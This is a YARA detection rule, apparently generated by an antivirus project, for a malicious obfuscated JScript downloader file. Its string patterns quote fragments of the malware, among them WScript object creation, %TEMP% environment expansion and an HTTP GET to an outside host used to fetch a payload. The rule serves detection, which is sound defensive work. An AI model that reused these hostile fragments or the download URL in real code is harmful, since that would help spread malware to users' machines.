rule sig_20160428_fdd3bc86ad717b56e96027a9701b281d {
  meta:
    description = "datamaliciousorder - file 20160428_fdd3bc86ad717b56e96027a9701b281d.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "ee6dffb3623ecde65727a394f67a5e0be3ac746acec63d437f81ed4030e0616c"

  strings:
    $s1  = "function DwmApkAxkIpqDerPnyFwh(SklOpbGkeOlzQfvBbiQuo){AyfJatJhiQxuGwgFhwIws[(\"Cunt\", \"anal\", \"R\")+ \"u\" + (\"fuck\", \"n" ascii
    $s2  = "function DwmApkAxkIpqDerPnyFwh(SklOpbGkeOlzQfvBbiQuo){AyfJatJhiQxuGwgFhwIws[(\"Cunt\", \"anal\", \"R\")+ \"u\" + (\"fuck\", \"n" ascii
    $s3  = "function UrkMqmAciJlnFlmBqdCmr() {return AyfJatJhiQxuGwgFhwIws[\"E\"+\"xpandEnvir\"+\"cock\".charAt(1)+\"nmentStrings\"](\"%TE\"" ascii
    $s4  = "function PnjWyfPioAisFlqJnxBxq(SlwZiaElvDdbEpuSnkFrq, FshPppLxpAsfMwdHxiCfl){GdrPzhFxtPmgPjxIcmBvi = GdrPzhFxtPmgPjxIcmBvi * 1; " ascii
    $s5  = "var AyfJatJhiQxuGwgFhwIws = function OizFibWkdMnuKbkWoaTey() {return XzvDzqXlhFppWifKqtZik[LagGtlXqtEixDimRozBqy](\"WScript\"+\"" ascii
    $s6  = "return SlwZiaElvDdbEpuSnkFrq - FshPppLxpAsfMwdHxiCfl;};" fullword ascii
    $s7  = "UhvFvhChpMumUbkWljIwj[IdcDdhVdzJijGimTkuJij](\"G\" + \"ET\", \"http://alex-naumov.ru/j8skdwq\", false);" fullword ascii
    $s8  = "var AyfJatJhiQxuGwgFhwIws = function OizFibWkdMnuKbkWoaTey() {return XzvDzqXlhFppWifKqtZik[LagGtlXqtEixDimRozBqy](\"WScript\"+\"" ascii
    $s9  = "var XzvDzqXlhFppWifKqtZik = this[\"WScript\"];" fullword ascii
    $s10 = "function UrkMqmAciJlnFlmBqdCmr() {return AyfJatJhiQxuGwgFhwIws[\"E\"+\"xpandEnvir\"+\"cock\".charAt(1)+\"nmentStrings\"](\"%TE\"" ascii
    $s11 = "if (UhvFvhChpMumUbkWljIwj[\"r\"+\"eadystate\"] < 2 * 2) continue;" fullword ascii
    $s12 = "function PnjWyfPioAisFlqJnxBxq(SlwZiaElvDdbEpuSnkFrq, FshPppLxpAsfMwdHxiCfl){GdrPzhFxtPmgPjxIcmBvi = GdrPzhFxtPmgPjxIcmBvi * 1; " ascii
    $s13 = "function AleVwgNxmZsqQjdOftTop() {return ((XghJnlLtdNhjMixYfpAkd == true) && (XghJnlLtdNhjMixYfpAkd == MkeVwlRnoJhcXnlGiuCyc)) ?" ascii
    $s14 = "function AleVwgNxmZsqQjdOftTop() {return ((XghJnlLtdNhjMixYfpAkd == true) && (XghJnlLtdNhjMixYfpAkd == MkeVwlRnoJhcXnlGiuCyc)) ?" ascii
    $s15 = "return PnjWyfPioAisFlqJnxBxq(1 == 1 ? RtrItmQkpQjlHtsXknEgn : 0, 1 == 1 ? IbzKqfRzhZtrOdeHhuSpa : 0);" fullword ascii
    $s16 = "var MrbBxwTrsOnjSqxCguNsy = false;" fullword ascii
    $s17 = "function AmbZpgFxeGqnPkgPwjUac(){return LagGtlXqtEixDimRozBqy;};" fullword ascii
    $s18 = "var XghJnlLtdNhjMixYfpAkd = false;" fullword ascii
    $s19 = "function UokXwjNfbYrgGthJbhSgj(){return 23;};" fullword ascii
    $s20 = "function FiaUmsFtbTlaXgzPcyBhr(FtlMbeZxeAomAnuVnoAmq) {var HrzNwoGbmGkaXrhPwvTin = (1, 2, 3, 4, 5, FtlMbeZxeAomAnuVnoAmq); retur" ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}